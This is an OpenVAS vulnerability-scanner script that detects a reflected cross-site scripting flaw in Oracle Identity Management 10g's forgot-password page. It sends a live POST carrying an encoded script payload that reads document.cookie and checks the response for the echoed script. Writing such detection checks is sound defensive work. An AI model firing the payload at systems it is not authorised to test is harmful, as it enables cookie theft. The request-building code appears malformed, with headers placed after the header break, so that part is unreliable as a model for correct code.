##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oracle_identity_management_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Oracle Identity Management 'username' Cross Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "Oracle Identity Management 10g httpd version 10.1.2.2.0";
tag_insight = "The flaw is due to improper validation of user-supplied input passed to
  'username' parameter via POST method through
  '/usermanagement/forgotpassword/index.jsp' script.";
tag_solution = "No solution or patch is available as of 05th October, 2012. Information
  regarding this issue will be updated once the solution details are available.
  http://www.oracle.com/us/products/middleware/identity-management/overview/index.html";
tag_summary = "This host is running Oracle Identity Management and is prone to
  cross site scripting vulnerability.";

if(description)
{
  script_id(802465);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-10-05 15:31:43 +0530 (Fri, 05 Oct 2012)");
  script_name("Oracle Identity Management 'username' Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2012100042");
  script_xref(name : "URL" , value : "http://www.zeroscience.mk/codes/oim_xss.txt");
  script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5110.php");
  script_xref(name : "URL" , value : "http://dl.packetstormsecurity.net/1210-exploits/ZSL-2012-5110.txt");
  script_xref(name : "URL" , value : "http://www.exploitsdownload.com/exploit/na/oracle-identity-management-10g-cross-site-scripting");

  script_description(desc);
  script_summary("Check if Oracle Identity Management is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 443);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("openvas-https.inc");

## Variable Initialization
req = "";
res = "";
port = 0;
host = "";
data = "";

## Get Port
port = get_http_port(default:443);
if(!port){
  exit(0);
}

## Get Host Name
host = get_host_name();
if(!host){
  exit(0);
}

## Construct https request
req = string("GET /index.html HTTP/1.1\r\n",
             "Host: ", host, "\r\n\r\n");
res = https_req_get(port:port, request:req);

## Confirm the application before trying exploit
if(res && ">Oracle Identity Management" >< res)
{
  ## Construct attack request
  data = "btnSubmit=SUBMIT&username=%22%3E%3Cscript%3Ealert%28document.cookie" +
         "%29%3B%3C%2Fscript%3E";

  req = string("POST /usermanagement/forgotpassword/index.jsp HTTP/1.1\r\n",
               "Host: ", host, "\r\n\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(data), "\r\n", data);

  ## Send request and receive the response
  res = https_req_get(port:port, request:req);

  ## Confirm exploit worked by checking the response
  if(res && "><script>alert(document.cookie);</script>" >< res &&
     ">Your username '" >< res){
    security_warning(port);
  }
}
